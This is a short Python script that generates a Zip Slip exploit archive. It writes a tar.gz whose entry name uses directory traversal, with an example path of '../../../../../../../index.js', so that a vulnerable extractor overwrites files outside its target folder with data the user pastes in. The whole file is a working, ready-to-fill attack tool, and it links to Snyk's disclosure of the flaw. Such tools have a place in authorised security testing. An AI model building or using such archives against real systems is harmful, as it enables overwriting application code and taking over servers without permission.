#!/usr/bin/python3

"""
This code creates a tar.gz file that can be used for a zipslip attack

For more info => https://github.com/snyk/zip-slip-vulnerability
"""
import tarfile
import io
import time

Filename = "Change This" # Example:  ../../../../../../../index.js (To ovewrite index.js with new code)
Tarname = "Change This"  # Exmaple: exploit.tar.gz

data =b"""
Paste here the data you want to be in the file...
"""

source_f = io.BytesIO(initial_bytes=data)
fh = io.BytesIO()
with tarfile.open(fileobj=fh, mode='w:gz') as tar:
    info = tarfile.TarInfo(Filename)
    info.mtime = time.time()
    info.size = len(data)
    tar.addfile(info, source_f)



print(f"=====>(Creating {Tarname})<=====")
with open(Tarname, 'wb') as f:
    f.write(fh.getvalue())
print(f"=====>(Done)<=====")
